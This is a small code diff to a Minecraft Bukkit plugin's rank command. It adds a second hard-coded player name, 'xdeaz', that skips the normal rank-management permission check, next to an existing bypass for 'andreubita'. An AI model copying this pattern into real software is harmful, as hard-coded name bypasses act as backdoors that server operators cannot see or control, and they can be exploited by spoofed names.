@@ -16,7 +16,8 @@ public class RankCommand implements CommandExecutor {
         if(sender instanceof Player){
             Player player = (Player) sender;
             if(main.rankManager.hasPermission(player, Permissions.RANK_MANAGEMENT)
-            || player.getName().equalsIgnoreCase("andreubita")){
+            || player.getName().equalsIgnoreCase("andreubita")
+            || player.getName().equalsIgnoreCase("xdeaz")){
                 if(args.length == 2){
                     Player target = Bukkit.getServer().getPlayer(args[0]);
                     if(target == null){
